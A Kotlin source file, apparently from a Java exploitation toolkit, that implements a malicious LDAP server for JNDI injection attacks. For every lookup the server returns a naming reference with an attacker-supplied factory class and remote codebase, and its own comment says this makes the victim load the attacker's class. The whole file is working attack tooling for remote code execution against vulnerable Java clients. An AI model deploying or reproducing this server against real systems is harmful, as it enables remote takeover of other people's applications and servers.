package top.ceclin.jser.tool.ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry

/**
 * An evil ldap server that returns a reference with [factory] and [codeBase] for any client lookup operation.
 * As a result, victim will load [factory] class on [codeBase].
 */
class LdapRemote(
    private val factory: String,
    private val codeBase: String,
    port: Int = 1389,
) {
    private val directoryServer = LdapCommon.createDirectoryServer(port) {
        addInMemoryOperationInterceptor(object : InMemoryOperationInterceptor() {
            override fun processSearchRequest(request: InMemoryInterceptedSearchRequest) {
                request.setRequest(LdapCommon.voidSearchRequest)
            }

            override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
                val entry = Entry(result.request.baseDN).apply {
                    addAttribute("objectClass", "javaNamingReference")
                    addAttribute("javaClassName", "any")
                    addAttribute("javaFactory", factory)
                    addAttribute("javaCodeBase", codeBase)
                }
                result.sendSearchEntry(entry)
            }
        })
    }

    fun start() {
        directoryServer.startListening()
    }

    fun stop() {
        directoryServer.shutDown(true)
    }
}